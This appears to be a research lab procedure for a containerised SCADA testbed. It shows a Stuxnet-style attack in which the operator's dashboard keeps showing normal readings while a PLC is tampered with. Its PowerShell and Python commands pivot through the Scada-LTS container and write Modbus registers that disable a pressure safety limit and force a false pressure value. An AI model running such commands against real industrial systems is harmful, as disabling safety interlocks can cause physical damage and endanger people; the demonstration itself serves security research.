# Stuxnet-style demonstration

This is the stretch goal of v0.2.1: a single paper-grade figure showing
that an attacker on the network can tamper with PLC values via Modbus
while the operator's HMI dashboard continues to display pre-attack
readings.

This is the actual mechanism Stuxnet used against Iranian centrifuges:
real damage in the physical process, normal-looking screens for the
operator. Demonstrating it on your testbed is one of the strongest
visual artefacts you can put in the paper.

## What this demo proves

The HMI's Modbus polling cycle (typically 1 second) and the attacker's
write rate determine what the operator sees:

- **Slow polling + fast attacker writes** → operator sees pre-attack snapshot
- **Fast polling + slow attacker writes** → operator sees the attack happen
- **Race condition with PLC scan cycle** → flickering values

We can manipulate the polling rate of specific data points to make the
demo more dramatic.

## Prerequisites

- v0.2.1 manual HMI configuration complete (data sources + dashboard)
- Process simulator running OR safe baseline values manually set
- Browser open on `http://localhost:9090/Scada-LTS` showing the dashboard
- Second window with PowerShell ready

## Procedure

### 1. Establish baseline

In the HMI Watch List, set the polling rate for `DistributionPressure`
and `OverpressureAlarm` to **30 seconds** (instead of 1 second).

> This simulates a slow industrial polling rate, which is realistic for
> safety-critical readings in real plants. It also gives our attack
> visible duration.

### 2. Take "before" screenshot

With pressure stable at ~50 (normal), take a screenshot of the
dashboard. This is the operator's view.

### 3. Run the attack

In PowerShell:

```powershell
docker exec agent python /app/scripts/exploit_seeded_hmi.py
```

Then immediately:

```powershell
docker exec agent python -c "
from tools.modbus_client import PLCS, ModbusConnector
import time

# This wouldn't work directly because the agent is on dmz-net, not ot-net.
# In production, the attacker would pivot through Scada-LTS first.
# For the demo, we run this inside the scadalts container which has
# both networks attached:
"
```

For now, drive the attack from within scadalts:

```powershell
docker exec scadalts sh -c "
  apt-get install -y python3 python3-pip 2>&1 > /dev/null
  pip3 install pymodbus==3.7.4 2>&1 > /dev/null
  python3 -c \"
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('plc3-distribution', port=502)
c.connect()
# Disable safety: pressure max 9999
c.write_register(1, 9999, slave=1)
# Force pressure reading way up by writing the simulator-driven sensor reg
c.write_register(10, 180, slave=1)
print('Pressure tampered to 180, safety disabled')
c.close()
  \"
"
```

### 4. Watch the dashboard

For ~30 seconds the dashboard still shows pressure ≈ 50 (cached value).

The PLC, however, sees pressure = 180 and is in alarm condition (or
would be, except we also disabled the alarm trigger).

### 5. Take "after, but operator unaware" screenshot

Take a second dashboard screenshot. Pressure gauge still shows ~50.

This is your paper figure: **two screenshots side-by-side, identical
operator view, but the underlying PLC state differs catastrophically.**

### 6. Wait for poll cycle

After the 30-second poll cycle elapses, the dashboard catches up and
shows the real (tampered) value.

### 7. Reset

```powershell
docker exec agent python /app/scripts/init_defaults.py
```

(Once a safe path is added — for now, use the scadalts-shell-Python
trick to write `pressure_max=80` and `pressure_sensor=50` back.)

## What the paper figure should say

Caption suggestion:

> **Figure X — Operator unawareness during cyber-physical attack.**
> (a) Baseline operator view with all values nominal. (b) Operator view
> after the attacker has manipulated PLC3's pressure setpoint and
> overridden the safety relief threshold. The dashboard continues to
> display the pre-attack reading because of the 30-second polling
> interval on the safety-critical channel. The underlying PLC state
> shows pressure at 180% of safe maximum.

## Caveats

- The 30-second polling interval is artificially slow. Real plants
  typically poll at 1-5 seconds. The effect is the same; just shorter
  window of opportunity for the attacker.
- This demo simulates the "operator unaware" phase. Sustained attacks
  eventually become visible. Stuxnet handled this by replaying recorded
  normal values continuously — beyond v0.2.1 scope but worth a future
  research direction.
